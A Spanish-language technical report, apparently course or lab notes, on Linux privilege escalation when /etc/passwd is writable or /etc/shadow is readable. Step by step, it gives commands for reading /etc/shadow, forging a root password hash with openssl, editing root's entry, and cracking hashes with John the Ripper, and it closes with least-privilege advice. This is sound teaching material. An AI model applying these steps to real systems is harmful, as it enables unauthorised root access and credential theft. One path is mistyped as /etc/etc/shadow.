# Informe Técnico: Escalada de Privilegios en Linux Utilizando Abuso de Permisos de Lectura/Escritura

## 1. Resumen Ejecutivo
Este informe técnico detalla cómo un atacante puede explotar la mala configuración de permisos en los archivos `/etc/passwd` y `/etc/shadow` de un sistema Linux para escalar privilegios. Se explican las funciones y la configuración de permisos adecuadas de ambos archivos, y se demuestra el procedimiento práctico para identificar permisos vulnerables y manipular estos archivos. El informe cubre cómo obtener acceso de superusuario modificando la contraseña en `/etc/passwd` o rompiendo la contraseña hasheada de `/etc/shadow`.

---

## 2. Conceptos Fundamentales

### Archivo `/etc/passwd`
Este archivo contiene información de los usuarios del sistema, incluyendo sus nombres de usuario, identificadores de usuario (UID), identificadores de grupo (GID), directorio de inicio (`home`), y la shell de inicio. Aunque el archivo es público y puede ser leído por cualquier usuario del sistema, solo los usuarios con privilegios pueden modificarlo. El campo de la contraseña en este archivo se representa con una `x`, que actúa como un puntero al archivo `/etc/shadow`, donde se encuentra el hash de la contraseña real por motivos de seguridad.

### Archivo `/etc/shadow`
Este archivo almacena las contraseñas de los usuarios, pero de forma hasheada, lo que las hace ilegibles para un usuario común. A diferencia de `/etc/passwd`, el archivo `/etc/shadow` tiene permisos restrictivos y solo puede ser leído y modificado por el superusuario.

### Representación Octal de Permisos en `chmod`
Los permisos de archivo en Linux se pueden representar con un sistema numérico octal. Cada permiso de lectura, escritura y ejecución tiene un valor asignado, y estos valores se suman para cada grupo de usuarios (propietario, grupo y otros).
* **Lectura (`r`)**: 4
* **Escritura (`w`)**: 2
* **Ejecución (`x`)**: 1

Por ejemplo, `646` significa:
* **Propietario (6)**: Lectura (4) + Escritura (2).
* **Grupo (4)**: Solo Lectura (4).
* **Otros (6)**: Lectura (4) + Escritura (2).

### Hashing de Contraseñas y el Salt
El **hashing** es un proceso que convierte una contraseña en una cadena de caracteres irreversible. El **salt** es una cadena de datos aleatorios que se añade a la contraseña antes de aplicar el algoritmo de hash. Este método previene ataques de diccionario y de tablas arcoíris, ya que incluso si dos usuarios tienen la misma contraseña, su hash será diferente porque el salt utilizado es único.

### Herramientas de Ciberseguridad
* **`ls -l`**: Comando para listar archivos y sus permisos, incluyendo la propiedad, el tamaño y la fecha de modificación.
* **`chmod`**: Utilidad para cambiar los permisos de los archivos y directorios.
* **`openssl`**: Herramienta de línea de comandos que permite generar hashes de contraseñas, entre otras funciones de cifrado.
* **`John the Ripper`**: Una popular herramienta de código abierto para descifrar contraseñas, comúnmente utilizada para auditar la seguridad de las contraseñas.
* **`LinPEAS`**: Una herramienta de enumeración de vulnerabilidades que detecta permisos débiles en archivos sensibles del sistema.

---

## 3. Procedimientos Prácticos

### Abuso de Permisos de Escritura en `/etc/passwd`

Este procedimiento explota un escenario donde un atacante tiene permisos de escritura sobre el archivo `/etc/passwd`.

1.  **Verificar permisos de archivo**: El atacante utiliza el comando `ls -l /etc/passwd` para determinar los permisos actuales del archivo. En un sistema seguro, la salida mostraría que solo el usuario `root` tiene permisos de escritura.
2.  **Modificar permisos del archivo (simulación)**: Para la demostración, un administrador (simulado) cambia los permisos del archivo para que los "otros usuarios" (`others`) tengan permisos de lectura y escritura. Esto se logra con el comando `sudo chmod 646 /etc/passwd`. Después de este cambio, `ls -l` revelaría que los permisos ahora son `-rw-r--rw-`, permitiendo a los usuarios no privilegiados escribir en el archivo.
3.  **Generar un nuevo hash de contraseña**: El atacante usa la herramienta `openssl` para crear un nuevo hash de contraseña que controlará. Por ejemplo, el comando `openssl passwd -1 -salt abc chema` genera un hash MD5 para la contraseña `chema` con el salt `abc`.
4.  **Sobreescribir la contraseña de un usuario privilegiado**: El atacante edita el archivo `/etc/passwd` con un editor de texto (como `nano` o `vi`), tal como se muestra en la captura de pantalla. Luego, reemplaza la `x` en la entrada de un usuario privilegiado (como `root`) con el hash de contraseña recién generado.
5.  **Escalada de privilegios**: Finalmente, el atacante utiliza el comando `su root` e introduce la nueva contraseña (`chema` en este caso). El sistema valida la contraseña directamente desde el archivo `/etc/passwd` en lugar de consultar `/etc/shadow`, concediendo al atacante acceso de `root`.

---

### Abuso de Permisos de Lectura en `/etc/shadow`

Este procedimiento demuestra cómo la lectura de `/etc/shadow` puede ser suficiente para escalar privilegios.

1.  **Modificar permisos del archivo (simulación)**: El administrador cambia los permisos del archivo `/etc/etc/shadow` para permitir que otros usuarios lo lean. Esto se hace con el comando `sudo chmod 644 /etc/shadow`.
2.  **Obtener el hash de la contraseña**: El atacante utiliza `cat /etc/shadow` para leer el contenido del archivo y copiar el hash de la contraseña de un usuario privilegiado, como `kali`, tal como se muestra en la captura de pantalla.
3.  **Descifrar el hash**: Con el hash copiado, el atacante utiliza una herramienta como `John the Ripper` junto con un diccionario de contraseñas (`rockyou.txt`) para intentar romper el hash y descubrir la contraseña original.
4.  **Uso del comando**: El comando `john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt hash1` especifica la lista de palabras, el formato de cifrado (`crypt` para Yescrypt) y el archivo que contiene el hash.
5.  **Éxito en la escalada**: Una vez que la herramienta descifra la contraseña, el atacante puede usarla para autenticarse como el usuario privilegiado y obtener acceso de `root`.

---

## 4. Conclusiones y Puntos Clave

### Importancia y Beneficios de Seguridad
La escalada de privilegios a través de la manipulación de archivos sensibles es una vulnerabilidad crítica. El principio de "privilegio mínimo" es fundamental para la ciberseguridad: los permisos deben limitarse estrictamente a lo que un usuario o aplicación necesita para funcionar. Una configuración laxa, como permitir la escritura en `/etc/passwd` o la lectura en `/etc/shadow`, abre la puerta a un control total del sistema por parte de un atacante.

### Puntos de Aprendizaje Clave
* **Función de los archivos `passwd` y `shadow`**: Comprender cómo estos archivos almacenan la información de los usuarios y las contraseñas es esencial para la gestión de la seguridad del sistema.
* **La `x` en `passwd`**: La `x` es un marcador de posición que apunta al hash real de la contraseña en el archivo `shadow`, un mecanismo de seguridad vital.
* **Riesgos de permisos incorrectos**: Una mala configuración de permisos puede ser explotada de dos maneras principales:
    * Si `/etc/passwd` es modificable, el atacante puede inyectar un nuevo hash de contraseña para autenticarse como cualquier usuario.
    * Si `/etc/shadow` es legible, el atacante puede robar hashes y usar herramientas para descifrar contraseñas débiles.
* **Vulnerabilidad más allá de `passwd` y `shadow`**: Este tipo de ataque es extensible a cualquier archivo que contenga información sensible, como claves privadas SSH o credenciales de bases de datos, si sus permisos no están configurados correctamente.

### Relevancia Técnica
Para los profesionales de la seguridad, la capacidad de identificar y explotar estas vulnerabilidades es tan importante como saber cómo prevenirlas. Auditar los permisos de archivos sensibles con herramientas automáticas (como LinPEAS) o manualmente con `ls -l` es una tarea de rutina para un analista de seguridad. Un administrador de sistemas debe ser riguroso al aplicar `chmod` para evitar errores que puedan comprometer todo el sistema, y siempre debe favorecer el principio de menor privilegio.

---

